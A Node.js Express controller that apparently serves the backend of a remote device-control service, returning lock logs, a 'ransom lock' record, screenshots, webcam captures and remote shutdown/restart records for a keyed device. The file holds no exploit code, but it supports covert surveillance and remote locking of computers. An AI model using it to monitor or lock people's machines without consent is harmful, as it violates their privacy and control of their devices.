const { unSignKey } = require("../funcations/jwt.lib");
const Lock = require("../Models/lock.model");
const Logs = require("../Models/Logs.model");
const Order = require("../Models/order.model");

exports.getSecurityReports = async (req, res) => {
  try {
    const { e_key } = req.body;

    const reports = [];
    // hit lock logs
    const windows_lock_reports = await Logs.findOne({
      key: unSignKey(e_key).key,
    });
    // convert them to timestamps
    windows_lock_reports.LockLogs.forEach((e) => {
      e.timestamp = new Date(e.timestamp).getTime();
    });

    // sort array according to ts
    let sorted_windows_lock_reports = windows_lock_reports.LockLogs.sort(
      (a, b) => (a.timestamp < b.timestamp ? 1 : -1)
    );

    // hit ransom lock
    const ransom_reports = await Lock.findOne({ key: unSignKey(e_key).key });

    // add to array
    reports.push(sorted_windows_lock_reports, ransom_reports);

    // you made it
    return res.json({ reports });
  } catch (error) {
    console.log(error);
    return res.sendStatus(500);
  }
};

exports.getScreenshotsReports = async (req, res) => {
  try {
    const { e_key } = req.body;

    const screenshots = await Order.find({
      key: unSignKey(e_key).key,
      order: "INSTANT_SCREEN",
      active: false,
      media: { $ne: null },
    }).sort("-createdAt");

    return res.json({ screenshots });
  } catch (error) {
    console.log(error);
    return res.sendStatus(500);
  }
};

exports.getCameraReports = async (req, res) => {
  try {
    const { e_key } = req.body;

    const camera = await Order.find({
      key: unSignKey(e_key).key,
      order: "EYE_ON_THE_SKY",
      active: false,
      media: { $ne: null },
    }).sort("-createdAt");

    return res.json({ camera });
  } catch (error) {
    console.log(error);
    return res.sendStatus(500);
  }
};

exports.getPowerReports = async (req, res) => {
  try {
    const { e_key } = req.body;

    const power = await Order.find({
      key: unSignKey(e_key).key,
      order: ["SHUTDOWN_THE_SKY", "RESTART_THE_SKY"],
      active: false,
      media: { $ne: null },
    }).sort("-createdAt");

    return res.json({ power });
  } catch (error) {
    console.log(error);
    return res.sendStatus(500);
  }
};
